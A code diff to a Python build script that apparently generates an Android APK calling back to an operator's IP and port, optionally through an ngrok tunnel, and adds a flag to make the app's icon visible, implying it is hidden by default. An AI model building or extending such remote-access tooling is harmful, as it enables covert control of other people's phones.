@@ -22,6 +22,7 @@ parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
 parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
 parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
+parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
 args = parser.parse_args()
 
 
@@ -33,6 +34,7 @@ if float(platform.python_version()[:-2]) < 3.6 and float(platform.python_version
 
 if args.build:
     port_ = args.port
+    icon=True if args.icon else None
     if args.ngrok:
         conf.get_default().monitor_thread = False
         port = 8000 if not port_ else port_
@@ -41,10 +43,10 @@ if args.build:
         domain,port = tcp_tunnel.public_url[6:].split(":")
         ip = socket.gethostbyname(domain)
         print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
-        build(ip,port,args.output,True,port_)
+        build(ip,port,args.output,True,port_,icon)
     else:
         if args.ip and args.port:
-            build(args.ip,port_,args.output,False,None)
+            build(args.ip,port_,args.output,False,None,icon)
         else:
             print(stdOutput("error")+"\033[1mArguments Missing")
 
